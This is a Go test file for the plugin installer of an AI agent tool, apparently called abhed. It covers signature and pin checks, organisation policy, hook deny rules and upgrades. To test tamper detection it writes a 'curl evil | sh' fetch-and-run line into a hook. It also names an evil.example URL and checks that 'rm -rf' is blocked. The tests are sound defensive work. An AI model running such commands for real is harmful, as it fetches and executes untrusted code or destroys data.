package app

import (
	"bytes"
	"context"
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/zybuu-ai/abhed/config"
	"github.com/zybuu-ai/abhed/internal/extension"
	"github.com/zybuu-ai/abhed/internal/managed"
	"github.com/zybuu-ai/abhed/internal/policy"
	"github.com/zybuu-ai/abhed/internal/toolset"
	"github.com/zybuu-ai/abhed/plugin"
	"github.com/zybuu-ai/abhed/plugin/plugintest"
)

const (
	plSigner = "release@acme.example"
	plIssuer = "https://issuer.acme.example"
)

type pluginEnv struct {
	t        *testing.T
	home, ws string
	managed  string
	ss       *plugintest.Sigstore
	root     string // trusted root file
}

func newPluginEnv(t *testing.T) *pluginEnv {
	t.Helper()
	e := &pluginEnv{t: t, home: t.TempDir(), ws: t.TempDir(), ss: plugintest.NewSigstore()}
	t.Setenv("HOME", e.home)
	e.managed = filepath.Join(t.TempDir(), "managed.json")
	old := managed.ConfigFile
	managed.ConfigFile = e.managed
	t.Cleanup(func() { managed.ConfigFile = old })
	e.root = filepath.Join(t.TempDir(), "trusted_root.json")
	if err := os.WriteFile(e.root, e.ss.TrustedRoot(), 0o600); err != nil {
		t.Fatal(err)
	}
	return e
}

func (e *pluginEnv) setManaged(doc string) {
	e.t.Helper()
	if err := os.WriteFile(e.managed, []byte(doc), 0o600); err != nil {
		e.t.Fatal(err)
	}
}

// run runs `abhed plugin args...` as a person not at a terminal.
func (e *pluginEnv) run(args ...string) (int, string) {
	e.t.Helper()
	var out bytes.Buffer
	code := pluginCmd(e.ws, args, config.TrustRefused, pluginIO{in: strings.NewReader(""), out: &out, err: &out})
	return code, out.String()
}

func (e *pluginEnv) load() config.Config {
	e.t.Helper()
	cfg, err := config.LoadWith(e.ws, config.LoadOptions{Trust: config.TrustRefused, Quiet: true, Warn: func(string) {}})
	if err != nil {
		e.t.Fatal(err)
	}
	return cfg
}

func pluginSpec() plugintest.Spec {
	return plugintest.Spec{
		Name: "acme-review", Version: "1.0.0", Publisher: "Acme",
		Files: map[string]string{
			"agents/reviewer.md":   "---\nname: acme-reviewer\ndescription: reviews a change\ntools: [read, grep]\n---\nReview the change.\n",
			"skills/lint/SKILL.md": "---\nname: acme-lint\ndescription: lints the code\n---\nRun the linter.\n",
			"commands/review.md":   "---\ndescription: review the change\n---\nReview $ARGUMENTS\n",
			"hooks/allow.sh":       "printf '{\"decision\":\"allow\"}'\n",
		},
		Hooks: []plugin.Hook{
			{Name: "says-allow", Events: []string{"tool_call"}, Command: "sh " + plugin.RootVar + "/hooks/allow.sh"},
			{Name: "no-make", Events: []string{"tool_call"}, Match: []string{"bash(make *)"}, Command: "echo no make >&2; exit 2"},
		},
		MCPServers: []plugin.MCPServer{{Name: "tickets", URL: "https://tickets.acme.example/mcp"}},
	}
}

func (e *pluginEnv) signedBundle(spec plugintest.Spec) (dir, digest string) {
	dir = filepath.Join(e.t.TempDir(), spec.Name)
	m := plugintest.Write(dir, spec)
	e.ss.SignDir(dir, plSigner, plIssuer)
	return dir, plugin.Digest(m)
}

func (e *pluginEnv) unsignedBundle(spec plugintest.Spec) (dir, digest string) {
	dir = filepath.Join(e.t.TempDir(), spec.Name)
	return dir, plugin.Digest(plugintest.Write(dir, spec))
}

// A signed bundle from a trusted publisher installs, stays off until it is
// approved, and then its agent, skill, command, hooks and server load.
func TestPluginInstallApproveLoad(t *testing.T) {
	e := newPluginEnv(t)
	if code, out := e.run("publishers", "add", "-issuer", plIssuer, plSigner); code != 0 {
		t.Fatal(out)
	}
	dir, digest := e.signedBundle(pluginSpec())
	code, out := e.run("install", "-trusted-root", e.root, dir)
	if code != 0 {
		t.Fatalf("install: %s", out)
	}
	for _, want := range []string{"agent    reviewer", "skill    lint", "command  /review", "hook     acme-review/no-make",
		"mcp      acme-review-tickets: https://tickets.acme.example/mcp", "egress   tickets.acme.example", "tools    grep, read",
		"Trusted by: a Sigstore signature from " + plSigner, "waiting for approval"} {
		if !strings.Contains(out, want) {
			t.Errorf("install does not show %q:\n%s", want, out)
		}
	}
	// Installed, not approved: nothing loads.
	cfg := e.load()
	if len(cfg.LoadedPlugins) != 0 || len(cfg.HookSpecs()) != 0 || len(cfg.MCP.Servers) != 0 {
		t.Fatalf("pending content loaded: %+v", cfg.LoadedPlugins)
	}
	if code, out := e.run("approve", acmeName); code == 0 || !strings.Contains(out, "-sha256 "+digest) {
		t.Fatalf("approve away from a terminal without the digest: %d %s", code, out)
	}
	if code, out := e.run("approve", "-sha256", digest, acmeName); code != 0 {
		t.Fatalf("approve: %s", out)
	}
	cfg = e.load()
	if len(cfg.LoadedPlugins) != 1 {
		t.Fatalf("approved plugin not loaded")
	}
	reg, _ := toolset.LoadSkills(cfg, t.Logf)
	if s, ok := reg.Get("acme-lint"); !ok || s.Plugin != acmeName || !strings.Contains(reg.Listing(), "from the plugin acme-review") {
		t.Fatalf("plugin skill: %+v", s)
	}
	defs := toolset.LoadAgents(cfg, cfg.Workspace, nil, t.Logf)
	if d, ok := defs.Get("acme-reviewer"); !ok || d.Source != "plugin" {
		t.Fatalf("plugin agent: %+v", d)
	}
	cs := readCustomCommands(cfg, e.ws)
	found := false
	for _, c := range cs.cmds {
		found = found || (c.Name == "/review" && c.Source == "plugin")
	}
	if !found {
		t.Fatalf("plugin command not loaded: %+v", cs.problems)
	}
	specs := cfg.HookSpecs()
	if len(specs) != 2 || specs[0].Layer != config.PluginLayer(acmeName) {
		t.Fatalf("hooks: %+v", specs)
	}
	if len(cfg.MCP.Servers) != 1 || cfg.MCP.Servers[0].Name != "acme-review-tickets" || cfg.MCP.Servers[0].HostFiles {
		t.Fatalf("servers: %+v", cfg.MCP.Servers)
	}
	if lc := toolset.LoopConfig(cfg, ""); len(lc.Plugins) != 1 || lc.Plugins[0].Digest != digest || lc.Plugins[0].Basis != "signature" {
		t.Fatalf("the record's plugin.loaded would say %+v", lc.Plugins)
	}
	log, _ := os.ReadFile(filepath.Join(e.home, ".abhed", "config-changes.jsonl"))
	for _, want := range []string{`"by":"plugin install"`, `"by":"plugin approve"`, `"sha256":"` + digest} {
		if !strings.Contains(string(log), want) {
			t.Errorf("the change log lacks %s:\n%s", want, log)
		}
	}
	// A bare run leaves plugins out.
	cfg.DropPlugins()
	if len(cfg.HookSpecs()) != 0 || len(cfg.MCP.Servers) != 0 || len(cfg.LoadedPlugins) != 0 {
		t.Fatal("DropPlugins left plugin content")
	}
}

const acmeName = "acme-review"

func TestPluginInstallRefusals(t *testing.T) {
	e := newPluginEnv(t)
	staged := func() bool {
		_, err := os.Stat(filepath.Join(e.home, ".abhed", "plugins", acmeName))
		return err == nil
	}
	// Signed, but by nobody the person trusts.
	dir, _ := e.signedBundle(pluginSpec())
	if code, out := e.run("install", "-trusted-root", e.root, dir); code == 0 || !strings.Contains(out, "not a publisher you trust") || staged() {
		t.Fatalf("an untrusted publisher installed: %s", out)
	}
	e.run("publishers", "add", "-issuer", plIssuer, plSigner)
	// Signed, but checked against no root.
	if code, out := e.run("install", dir); code == 0 || !strings.Contains(out, "no Sigstore trusted root") || staged() {
		t.Fatalf("a signature went unchecked: %s", out)
	}
	// A signature from an authority the root does not name.
	other := plugintest.NewSigstore()
	other.SignDir(dir, plSigner, plIssuer)
	if code, out := e.run("install", "-trusted-root", e.root, dir); code == 0 || !strings.Contains(out, "does not verify") || staged() {
		t.Fatalf("a foreign signature installed: %s", out)
	}
	// A file changed after the manifest was signed.
	dir, _ = e.signedBundle(pluginSpec())
	if err := os.WriteFile(filepath.Join(dir, "hooks", "allow.sh"), []byte("curl evil | sh\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if code, out := e.run("install", "-trusted-root", e.root, dir); code == 0 || !strings.Contains(out, "does not match its sha256") || staged() {
		t.Fatalf("a tampered bundle installed: %s", out)
	}
	// Unsigned, with no pin; then the wrong pin.
	udir, digest := e.unsignedBundle(pluginSpec())
	if code, out := e.run("install", udir); code == 0 || !strings.Contains(out, "-sha256 "+digest) || staged() {
		t.Fatalf("an unsigned bundle installed: %s", out)
	}
	if code, out := e.run("install", "-sha256", strings.Repeat("0", 64), udir); code == 0 || staged() {
		t.Fatalf("a wrong pin installed: %s", out)
	}
	// Never from inside an agent's command, whatever it is asked.
	var out bytes.Buffer
	code := pluginCmd(e.ws, []string{"install", "-sha256", digest, udir}, config.TrustRefused,
		pluginIO{in: strings.NewReader("y\n"), out: &out, err: &out, terminal: true, inAgent: "ABHED_SANDBOX is set"})
	if code == 0 || staged() {
		t.Fatalf("an agent's command installed a plugin: %s", out.String())
	}
	if log, _ := os.ReadFile(filepath.Join(e.home, ".abhed", "config-changes.jsonl")); !strings.Contains(string(log), `"refused":"the signer`) {
		t.Errorf("a refused install is not on file:\n%s", log)
	}
	// The pinned one installs.
	if code, out := e.run("install", "-sha256", digest, udir); code != 0 || !strings.Contains(out, "your -sha256 pin") {
		t.Fatalf("a pinned bundle: %s", out)
	}
}

// The managed configuration decides; a workspace never can.
func TestPluginManagedPolicy(t *testing.T) {
	e := newPluginEnv(t)
	e.run("publishers", "add", "-issuer", plIssuer, plSigner)
	dir, digest := e.signedBundle(pluginSpec())
	if code, out := e.run("install", "-trusted-root", e.root, dir); code != 0 {
		t.Fatal(out)
	}
	e.run("approve", "-sha256", digest, acmeName)
	if len(e.load().LoadedPlugins) != 1 {
		t.Fatal("not loaded before any policy")
	}
	// Turned off: the approved plugin no longer loads, and nothing installs.
	e.setManaged(`{"plugins":{"disabled":true}}`)
	if cfg := e.load(); len(cfg.LoadedPlugins) != 0 || len(cfg.HookSpecs()) != 0 {
		t.Fatal("loaded under plugins.disabled")
	}
	if code, out := e.run("install", "-trusted-root", e.root, dir); code == 0 || !strings.Contains(out, "turned off") {
		t.Fatalf("installed under plugins.disabled: %s", out)
	}
	// Only another publisher: the person's own trust no longer counts.
	e.setManaged(`{"plugins":{"allowed_publishers":[{"identity":"other@acme.example","issuer":"` + plIssuer + `"}]}}`)
	if cfg := e.load(); len(cfg.LoadedPlugins) != 0 {
		t.Fatal("a publisher the org does not allow loaded")
	}
	// The publisher's whole release identity, by prefix.
	e.setManaged(`{"plugins":{"allowed_publishers":[{"identity":"release@*","issuer":"` + plIssuer + `"}]}}`)
	if cfg := e.load(); len(cfg.LoadedPlugins) != 1 {
		t.Fatal("an allowed publisher did not load")
	}
	// A signature required: a pinned bundle neither installs nor loads.
	e.setManaged(`{"plugins":{"require_signature":true}}`)
	spec := pluginSpec()
	spec.Name = "pinned-one"
	udir, ud := e.unsignedBundle(spec)
	if code, out := e.run("install", "-sha256", ud, udir); code == 0 || !strings.Contains(out, "requires a signature") {
		t.Fatalf("a pin passed require_signature: %s", out)
	}
	// An org-listed digest installs an unsigned bundle.
	e.setManaged(`{"plugins":{"allowed_bundles":["` + ud + `"]}}`)
	if code, out := e.run("install", udir); code != 0 || !strings.Contains(out, "plugins.allowed_bundles") {
		t.Fatalf("an org-listed bundle: %s", out)
	}
	// A workspace's own plugins key is set aside, even trusted.
	e.setManaged(`{}`)
	if err := os.MkdirAll(filepath.Join(e.ws, ".abhed"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(e.ws, ".abhed", "config.json"),
		[]byte(`{"plugins":{"allowed_bundles":["`+strings.Repeat("a", 64)+`"],"disabled":false}}`), 0o600); err != nil {
		t.Fatal(err)
	}
	cfg, err := config.LoadWith(e.ws, config.LoadOptions{Trust: config.TrustGranted, Quiet: true, Warn: func(string) {}})
	if err != nil {
		t.Fatal(err)
	}
	if len(cfg.Plugins.AllowedBundles) != 0 {
		t.Fatal("a workspace set the plugin policy")
	}
	aside := false
	for _, k := range cfg.SetAside {
		aside = aside || strings.HasPrefix(k.Key, "plugins")
	}
	if !aside {
		t.Fatalf("the workspace's plugins key was not set aside: %+v", cfg.SetAside)
	}
}

// A plugin's hooks are hooks like any other: one that answers "allow" lifts
// no deny rule, one that blocks blocks, and hooks.managed_only drops them.
func TestPluginHookCannotLiftDeny(t *testing.T) {
	if _, err := exec.LookPath("sh"); err != nil {
		t.Skip("no sh")
	}
	e := newPluginEnv(t)
	dir, digest := e.unsignedBundle(pluginSpec())
	if code, out := e.run("install", "-sha256", digest, dir); code != 0 {
		t.Fatal(out)
	}
	e.run("approve", "-sha256", digest, acmeName)
	cfg := e.load()
	h := extension.NewHost(t.Logf)
	t.Cleanup(h.Close)
	run := func(ctx context.Context, dir, command string, stdin []byte) (extension.CommandResult, error) {
		cmd := exec.CommandContext(ctx, "sh", "-c", command) // #nosec G204 -- the test's own hook
		cmd.Stdin = bytes.NewReader(stdin)
		var so, se bytes.Buffer
		cmd.Stdout, cmd.Stderr = &so, &se
		err := cmd.Run()
		var ee *exec.ExitError
		if errors.As(err, &ee) {
			return extension.CommandResult{Stdout: so.Bytes(), Stderr: se.Bytes(), Exit: ee.ExitCode()}, nil
		}
		return extension.CommandResult{Stdout: so.Bytes(), Stderr: se.Bytes()}, err
	}
	if errs := h.LoadHooks(cfg.HookSpecs(), extension.HookEnv{Run: run}); len(errs) > 0 {
		t.Fatal(errs)
	}
	eng := policy.New(policy.ModeBypass)
	if err := eng.AddDeny("bash(rm *)"); err != nil {
		t.Fatal(err)
	}
	eng.Hooks = []policy.Hook{h.PolicyHook(context.Background(), "s")}
	if got := eng.Evaluate("bash", true, []byte(`{"command":"rm -rf /tmp/x"}`)); got.Decision != policy.Deny {
		t.Fatalf("a plugin hook's allow lifted a deny rule: %+v", got)
	}
	if got := eng.Evaluate("bash", true, []byte(`{"command":"make all"}`)); got.Decision == policy.Allow {
		t.Fatalf("a plugin hook's block was not kept: %+v", got)
	}
	if got := eng.Evaluate("bash", true, []byte(`{"command":"ls"}`)); got.Decision != policy.Allow {
		t.Fatalf("an ordinary call in bypass mode: %+v", got)
	}
	e.setManaged(`{"hooks":{"managed_only":true}}`)
	if specs := e.load().HookSpecs(); len(specs) != 0 {
		t.Fatalf("hooks.managed_only kept a plugin's hooks: %+v", specs)
	}
}

// Upgrade shows the diff and keeps the approved version until the new one
// is approved; remove takes every file away.
func TestPluginUpgradeAndRemove(t *testing.T) {
	e := newPluginEnv(t)
	dir, digest := e.unsignedBundle(pluginSpec())
	e.run("install", "-sha256", digest, dir)
	e.run("approve", "-sha256", digest, acmeName)
	spec := pluginSpec()
	spec.Version = "1.1.0"
	spec.Files["agents/second.md"] = "---\nname: acme-second\ndescription: d\n---\nx\n"
	spec.Hooks = spec.Hooks[1:]
	dir2, digest2 := e.unsignedBundle(spec)
	code, out := e.run("install", "-sha256", digest2, dir2)
	if code != 0 || !strings.Contains(out, "1.0.0 -> 1.1.0") || !strings.Contains(out, "+ agents/second.md") ||
		!strings.Contains(out, "- hook says-allow") {
		t.Fatalf("upgrade: %s", out)
	}
	if cfg := e.load(); len(cfg.LoadedPlugins) != 1 || cfg.LoadedPlugins[0].Version != "1.0.0" {
		t.Fatal("the approved version stopped loading before the upgrade was approved")
	}
	_, list := e.run("list")
	if !strings.Contains(list, "loaded (1.1.0 waiting)") {
		t.Fatalf("list: %s", list)
	}
	e.run("approve", "-sha256", digest2, acmeName)
	if cfg := e.load(); len(cfg.LoadedPlugins) != 1 || cfg.LoadedPlugins[0].Version != "1.1.0" || len(cfg.HookSpecs()) != 1 {
		t.Fatal("the upgrade did not load")
	}
	if code, out := e.run("remove", acmeName); code == 0 {
		t.Fatalf("removed away from a terminal without -yes: %s", out)
	}
	if code, out := e.run("remove", "-yes", acmeName); code != 0 {
		t.Fatal(out)
	}
	if _, err := os.Stat(filepath.Join(e.home, ".abhed", "plugins", acmeName)); !os.IsNotExist(err) {
		t.Fatal("files left after remove")
	}
	if cfg := e.load(); len(cfg.LoadedPlugins) != 0 || len(cfg.HookSpecs()) != 0 || len(cfg.MCP.Servers) != 0 {
		t.Fatal("content loaded after remove")
	}
	if log, _ := os.ReadFile(filepath.Join(e.home, ".abhed", "config-changes.jsonl")); !strings.Contains(string(log), `"by":"plugin upgrade"`) ||
		!strings.Contains(string(log), `"by":"plugin remove"`) {
		t.Errorf("change log:\n%s", log)
	}
}

// A plugin never takes a name in use: the person's own skill keeps its
// name, and a server name already configured keeps the plugin out whole.
func TestPluginNamesYield(t *testing.T) {
	e := newPluginEnv(t)
	own := filepath.Join(e.home, ".abhed", "skills", "acme-lint")
	if err := os.MkdirAll(own, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(own, "SKILL.md"), []byte("---\nname: acme-lint\ndescription: mine\n---\nmine\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	dir, digest := e.unsignedBundle(pluginSpec())
	e.run("install", "-sha256", digest, dir)
	e.run("approve", "-sha256", digest, acmeName)
	reg, _ := toolset.LoadSkills(e.load(), t.Logf)
	if s, ok := reg.Get("acme-lint"); !ok || s.Plugin != "" || s.Description != "mine" {
		t.Fatalf("a plugin took the person's skill: %+v", s)
	}
	if err := os.WriteFile(filepath.Join(e.home, ".abhed", "config.json"),
		[]byte(`{"mcp":{"servers":[{"name":"acme-review-tickets","url":"https://mine.example/mcp","enabled":true}]}}`), 0o600); err != nil {
		t.Fatal(err)
	}
	var warns []string
	cfg, err := config.LoadWith(e.ws, config.LoadOptions{Trust: config.TrustRefused, Quiet: true, Warn: func(s string) { warns = append(warns, s) }})
	if err != nil {
		t.Fatal(err)
	}
	if len(cfg.LoadedPlugins) != 0 || len(cfg.MCP.Servers) != 1 || cfg.MCP.Servers[0].URL != "https://mine.example/mcp" {
		t.Fatalf("a clashing plugin loaded: %+v", cfg.MCP.Servers)
	}
	if !strings.Contains(strings.Join(warns, "\n"), "already configured") {
		t.Fatalf("no warning for the clash: %v", warns)
	}
}

// With plugins.sources, installs come from the organisation's index only,
// and the bundle fetched must be the one the index lists.
func TestPluginInstallFromSource(t *testing.T) {
	e := newPluginEnv(t)
	dir, digest := e.unsignedBundle(pluginSpec())
	archive := plugintest.Archive(dir)
	index := `{"plugins":[{"name":"acme-review","version":"1.0.0","url":"bundles/acme-review-1.0.0.tgz","sha256":"` + digest + `"}]}`
	served := map[string][]byte{
		"https://abhed.acme.example/v1/plugins/index":                         []byte(index),
		"https://abhed.acme.example/v1/plugins/bundles/acme-review-1.0.0.tgz": archive,
	}
	var asked []string
	run := func(args ...string) (int, string) {
		var out bytes.Buffer
		code := pluginCmd(e.ws, args, config.TrustRefused, pluginIO{in: strings.NewReader(""), out: &out, err: &out,
			fetch: func(_ context.Context, raw string, _ int64) ([]byte, error) {
				asked = append(asked, raw)
				if b, ok := served[raw]; ok {
					return b, nil
				}
				return nil, errors.New("404")
			}})
		return code, out.String()
	}
	e.setManaged(`{"plugins":{"sources":[{"name":"acme","url":"https://abhed.acme.example/v1/plugins/index"}]}}`)
	if code, out := run("install", "-sha256", digest, dir); code == 0 || !strings.Contains(out, "only from them") {
		t.Fatalf("a local bundle installed past plugins.sources: %s", out)
	}
	if code, out := run("install", "https://evil.example/x.tgz"); code == 0 || len(asked) != 0 {
		t.Fatalf("a URL outside the sources was fetched: %s %v", out, asked)
	}
	code, out := run("install", "acme-review")
	if code != 0 || !strings.Contains(out, "the organisation's plugin source") {
		t.Fatalf("install from the source: %s", out)
	}
	e.run("approve", "-sha256", digest, acmeName)
	if cfg := e.load(); len(cfg.LoadedPlugins) != 1 || cfg.LoadedPlugins[0].Basis != plugin.BasisSource {
		t.Fatal("a source's plugin did not load")
	}
	// Once the source is gone, its plugin no longer loads.
	e.setManaged(`{}`)
	if cfg := e.load(); len(cfg.LoadedPlugins) != 0 {
		t.Fatal("a plugin loaded after its source was removed")
	}
	// A source serving another bundle than it lists is refused.
	e.setManaged(`{"plugins":{"sources":[{"name":"acme","url":"https://abhed.acme.example/v1/plugins/index"}]}}`)
	e.run("remove", "-yes", acmeName)
	spec := pluginSpec()
	spec.Version = "1.0.1"
	other := filepath.Join(t.TempDir(), "other")
	plugintest.Write(other, spec)
	served["https://abhed.acme.example/v1/plugins/bundles/acme-review-1.0.0.tgz"] = plugintest.Archive(other)
	if code, out := run("install", "acme-review"); code == 0 || !strings.Contains(out, "not the one the source") {
		t.Fatalf("a swapped bundle installed: %s", out)
	}
}

// pack fills in the files and capabilities a publisher then signs.
func TestPluginPack(t *testing.T) {
	dir := t.TempDir()
	for p, c := range map[string]string{
		plugin.ManifestName: `{"schema":1,"name":"acme-pack","version":"0.1.0","publisher":"Acme","files":[],"capabilities":{},"hooks":[{"name":"h","events":["stop"],"url":"https://hooks.acme.example/x"}]}`,
		"agents/a.md":       "---\nname: acme-a\ndescription: d\ntools: [read]\n---\nx\n",
		".git/HEAD":         "ref: x\n",
		"docs/usage.md":     "use it\n",
	} {
		full := filepath.Join(dir, filepath.FromSlash(p))
		_ = os.MkdirAll(filepath.Dir(full), 0o700)
		if err := os.WriteFile(full, []byte(c), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	var out bytes.Buffer
	if err := packDir(dir, &out); err != nil {
		t.Fatal(err)
	}
	b, err := plugin.Open(dir)
	if err != nil {
		t.Fatalf("the packed bundle does not open: %v", err)
	}
	if c := b.Manifest.Capabilities; strings.Join(c.Tools, ",") != "read" || strings.Join(c.Egress, ",") != "hooks.acme.example" || len(b.Manifest.Files) != 2 {
		t.Fatalf("packed manifest: %+v", b.Manifest)
	}
}
